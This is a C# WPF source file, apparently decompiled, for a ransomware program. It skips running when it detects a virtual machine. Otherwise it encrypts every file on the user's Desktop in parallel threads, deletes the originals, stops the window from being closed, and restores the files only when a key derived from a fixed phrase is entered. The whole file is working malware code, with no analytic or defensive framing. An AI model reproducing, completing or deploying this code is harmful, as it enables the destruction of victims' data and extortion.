using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Markup;
using System.Windows.Threading;
using Microsoft.Win32;
using ransomware_or_somethink_idk;

namespace ransomware;

public class BGWin : Window, IComponentConnector
{
	private float encodingProgress = 0f;

	internal ProgressBar EncProgress;

	internal TextBox KeyBox;

	internal Button KeySubmitBtn;

	internal ProgressBar DecProgress;

	internal Label DecCount;

	internal Label DecFile;

	private bool _contentLoaded;

	public BGWin()
	{
		InitializeComponent();
		if (Cipher.CheckVM())
		{
			((Window)this).Hide();
			Application.get_Current().Shutdown();
		}
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("ransomware");
		if (registryKey.GetValue("isEncoded") == null)
		{
			new Thread(Enc).Start();
		}
		else
		{
			((RangeBase)EncProgress).set_Value(100.0);
		}
		registryKey.Close();
	}

	private void Form1_Closing(object sender, CancelEventArgs e)
	{
		e.Cancel = true;
	}

	private void Enc()
	{
		int currThrCnt = 0;
		FileInfo[] files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)).GetFiles("*", SearchOption.AllDirectories);
		ulong encoded = 0uL;
		FileInfo[] array = files;
		foreach (FileInfo f in array)
		{
			new Thread((ThreadStart)delegate
			{
				FileInfo fileInfo = new FileInfo(f.FullName);
				int num = currThrCnt;
				currThrCnt = num + 1;
				if (Cipher.EncryptFile(fileInfo.FullName, fileInfo.FullName + "_ENCODED"))
				{
					fileInfo.Delete();
				}
				num = currThrCnt;
				currThrCnt = num - 1;
				ulong num2 = encoded;
				encoded = num2 + 1L;
				((DispatcherObject)this).get_Dispatcher().Invoke((Action)delegate
				{
					((RangeBase)EncProgress).set_Value((double)((float)(encoded * 100L) / (float)files.Length));
				});
			}).Start();
			while (currThrCnt >= 64)
			{
			}
		}
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("ransomware");
		registryKey.SetValue("isEncoded", true);
		registryKey.Close();
	}

	private void Dec()
	{
		int currThrCnt = 0;
		FileInfo[] files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)).GetFiles("*_ENCODED", SearchOption.AllDirectories);
		ulong count = 0uL;
		ulong errors = 0uL;
		FileInfo[] array = files;
		foreach (FileInfo f in array)
		{
			new Thread((ThreadStart)delegate
			{
				FileInfo fileInfo = new FileInfo(f.FullName);
				int num = currThrCnt;
				currThrCnt = num + 1;
				ulong num2;
				if (Cipher.DecryptFile(fileInfo.FullName, fileInfo.FullName.Substring(0, f.FullName.Length - 8)))
				{
					fileInfo.Delete();
				}
				else
				{
					num2 = errors;
					errors = num2 + 1L;
				}
				num = currThrCnt;
				currThrCnt = num - 1;
				num2 = count;
				count = num2 + 1L;
			}).Start();
			while (currThrCnt >= 64)
			{
			}
			((DispatcherObject)this).get_Dispatcher().Invoke((Action)delegate
			{
				((RangeBase)DecProgress).set_Value((double)((float)(count * 100L) / (float)files.Length));
				((ContentControl)DecFile).set_Content((object)f.FullName);
				((ContentControl)DecCount).set_Content((object)(((RangeBase)DecProgress).get_Value() + "% (" + count + "); " + errors + " ошибок"));
			});
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("ransomware");
			registryKey.DeleteValue("isEncoded");
			registryKey.Close();
		}
		((DispatcherObject)this).get_Dispatcher().Invoke((Action)delegate
		{
			Application.get_Current().Shutdown();
		});
	}

	private void SubmitKey(object sender, RoutedEventArgs e)
	{
		string text = KeyBox.get_Text().ToUpper().Trim();
		string text2 = Cipher.CreateMD5("The quick brown fox jumps over the lazy dog");
		if (text == text2)
		{
			new Thread(Dec).Start();
		}
		else
		{
			KeyBox.set_Text("Неверный ключ");
		}
	}

	[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
	[DebuggerNonUserCode]
	public void InitializeComponent()
	{
		if (!_contentLoaded)
		{
			_contentLoaded = true;
			Uri uri = new Uri("/ransomware;component/bgwin.xaml", UriKind.Relative);
			Application.LoadComponent((object)this, uri);
		}
	}

	[EditorBrowsable(EditorBrowsableState.Never)]
	[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
	[DebuggerNonUserCode]
	void IComponentConnector.Connect(int connectionId, object target)
	{
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0067: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		//IL_008c: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009e: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		switch (connectionId)
		{
		default:
			_contentLoaded = true;
			break;
		case 1:
			((Window)(BGWin)target).add_Closing((CancelEventHandler)Form1_Closing);
			break;
		case 2:
			EncProgress = (ProgressBar)target;
			break;
		case 3:
			KeyBox = (TextBox)target;
			break;
		case 4:
			KeySubmitBtn = (Button)target;
			((ButtonBase)KeySubmitBtn).add_Click(new RoutedEventHandler(SubmitKey));
			break;
		case 5:
			DecProgress = (ProgressBar)target;
			break;
		case 6:
			DecCount = (Label)target;
			break;
		case 7:
			DecFile = (Label)target;
			break;
		}
	}
}
